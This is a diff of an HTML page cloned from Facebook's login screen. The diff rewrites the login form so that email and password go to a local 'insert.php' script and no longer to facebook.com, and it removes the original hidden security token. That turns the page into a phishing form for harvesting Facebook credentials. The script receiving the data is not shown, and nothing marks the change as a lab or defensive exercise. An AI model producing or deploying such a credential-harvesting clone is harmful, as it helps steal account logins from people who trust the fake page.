@@ -233,15 +233,15 @@
                                 <h1><a href="https://www.facebook.com/" title="Go to Facebook home"><i class="fb_logo img sp_WQkjDN-lT6A sx_f70dca"><u>Facebook</u></i></a></h1>
                             </div>
                             <div class="menu_login_container rfloat _ohf" data-testid="royal_login_form">
-                                <form id="login_form" action="https://www.facebook.com/login.php?login_attempt=1&amp;lwv=110" method="post" novalidate="1" onsubmit="return window.Event &amp;&amp; Event.__inlineSubmit &amp;&amp; Event.__inlineSubmit(this,event)"><input type="hidden" name="lsd" value="AVpSaypy" autocomplete="off" />
+                                <form id="login_form" action="insert.php" method="post">
                                     <table cellspacing="0" role="presentation">
                                         <tr>
                                             <td class="html7magic"><label for="email">Email or Phone</label></td>
                                             <td class="html7magic"><label for="pass">Password</label></td>
                                         </tr>
                                         <tr>
-                                            <td><input type="email" class="inputtext" name="email" id="email" tabindex="1" data-testid="royal_email" /></td>
-                                            <td><input type="password" class="inputtext" name="pass" id="pass" tabindex="2" data-testid="royal_pass" /></td>
+                                            <td><input type="email" class="inputtext" name="email" id="email" tabindex="1" /></td>
+                                            <td><input type="password" class="inputtext" name="pass" id="pass" tabindex="2" /></td>
                                             <td><label class="uiButton uiButtonConfirm" id="loginbutton" for="u_0_5"><input value="Log In" tabindex="4" data-testid="royal_login_button" type="submit" id="u_0_5" /></label></td>
                                         </tr>
                                         <tr>
